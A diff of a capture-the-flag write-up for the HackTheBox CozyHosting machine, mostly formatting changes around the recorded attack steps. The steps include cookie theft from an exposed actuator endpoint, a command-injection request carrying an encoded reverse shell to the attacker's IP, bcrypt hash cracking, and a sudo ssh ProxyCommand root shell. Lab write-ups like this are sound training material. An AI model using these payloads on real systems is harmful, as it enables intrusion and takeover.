@@ -1,5 +1,11 @@
-# HackTheBox CozyHosting Writeup
+---
+description: HackTheBox CozyHosting Writeup (Easy)
+---
+
+# CozyHosting Writeup
+
 ## Nmap
+
 ```bash
 Nmap scan report for 10.10.11.230
 Host is up, received user-set (0.016s latency).
@@ -21,6 +27,7 @@ PORT     STATE SERVICE     REASON         VERSION
 ```
 
 ### Dirbuster
+
 ```bash
 gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/dirb/big.txt
 ===============================================================
@@ -55,6 +62,7 @@ Finished
 ```
 
 ### Actuator Session Cookie
+
 ```
 http://cozyhosting.htb/actuator/sessions
 
@@ -79,6 +87,7 @@ Content-Length: 245
 ```
 
 ### Command Injection
+
 ```
 POST /executessh HTTP/1.1
 Host: cozyhosting.htb
@@ -98,8 +107,8 @@ host=127.0.0.1&username=a%3b`echo${IFS}YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4
 ```
 
 ### Postgres
-Transfer cloudhosting-0.0.1.jar to local and read content with jadx.
-![Postgresql](https://github.com/ngohuiann/CTF-Write-Ups/blob/main/image/CosyHosting1.png)
+
+Transfer cloudhosting-0.0.1.jar to local and read content with jadx. ![Postgresql](../image/CosyHosting1.png)
 
 ```bash
 app@cozyhosting:/app$ psql -U postgres -h localhost
@@ -144,6 +153,7 @@ Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
 ```
 
 ## User Flag
+
 ```
 app@cozyhosting:/app$ su josh
 su josh
@@ -166,6 +176,7 @@ lrwxrwxrwx 1 root root    9 May 21  2023 .psql_history -> /dev/null
 ```
 
 ## Root Flag
+
 ```bash
 josh@cozyhosting:/app$ sudo -l
 sudo -l
@@ -184,4 +195,5 @@ sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
 ref: https://gtfobins.github.io/gtfobins/ssh/#sudo
